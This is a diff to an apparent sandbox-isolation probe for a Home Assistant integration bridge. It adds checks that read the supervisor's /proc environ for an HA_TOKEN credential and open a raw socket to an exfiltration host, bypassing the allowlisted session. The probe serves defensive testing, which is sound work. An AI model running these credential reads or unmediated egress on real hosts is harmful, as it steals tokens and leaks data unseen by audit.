@@ -12,6 +12,9 @@ isolation. Reporting that honestly is the point of running the probe at all.
 
 from __future__ import annotations
 
+import os
+import socket
+
 from homeassistant._bridge import PermissionDenied
 from homeassistant.core import HomeAssistant
 from homeassistant.helpers.aiohttp_client import async_get_clientsession
@@ -22,7 +25,7 @@ SECRETS_PATH = "/etc/passwd"  # stands in for /config/secrets.yaml on a real hos
 
 
 async def run_probe(hass: HomeAssistant) -> list[tuple[str, bool, str]]:
-    """Attempt five undeclared actions; return (name, blocked, detail)."""
+    """Attempt seven undeclared actions; return (name, blocked, detail)."""
     results: list[tuple[str, bool, str]] = []
     print("\nsandbox: running adversarial probe", flush=True)
 
@@ -71,6 +74,45 @@ async def run_probe(hass: HomeAssistant) -> list[tuple[str, bool, str]]:
         results.append(("read host filesystem", False, f"{SECRETS_PATH} readable — no fs isolation yet"))
     except OSError as err:
         results.append(("read host filesystem", True, str(err)))
+
+    # 6. Steal the supervisor's credential out of /proc and skip the bridge
+    #    entirely. See FINDINGS_2026-08-14_token_leak.md: this is the attack
+    #    that defeats the manifest without attacking it, because the supervisor
+    #    is never asked and the audit log never sees it.
+    parent = os.getppid()
+    try:
+        with open(f"/proc/{parent}/environ", "rb") as handle:
+            blob = handle.read()
+        holds_token = b"HA_TOKEN=" in blob
+        results.append(
+            (
+                "read supervisor's /proc",
+                False,
+                f"/proc/{parent}/environ readable"
+                + (" — CONTAINS HA_TOKEN" if holds_token else " (no token set this run)"),
+            )
+        )
+    except OSError as err:
+        results.append(("read supervisor's /proc", True, str(err)))
+
+    # 7. Egress without going through the shim's mediated session. The manifest
+    #    `network:` allowlist is enforced by aiohttp_client, so a raw socket
+    #    never consults it — no net_request is sent and nothing is logged.
+    try:
+        connection = socket.create_connection((EXFIL_HOST, 80), timeout=3)
+        connection.close()
+        results.append(("raw socket egress", False, f"connected to {EXFIL_HOST} unmediated"))
+    except PermissionError as err:
+        # What a seccomp filter denying socket(2) looks like from in here.
+        results.append(("raw socket egress", True, f"socket denied by syscall filter: {err}"))
+    except OSError as err:
+        results.append(
+            (
+                "raw socket egress",
+                False,
+                f"unmediated by policy, failed in transit: {type(err).__name__}",
+            )
+        )
 
     print("\nsandbox: probe results")
     for name, blocked, detail in results:
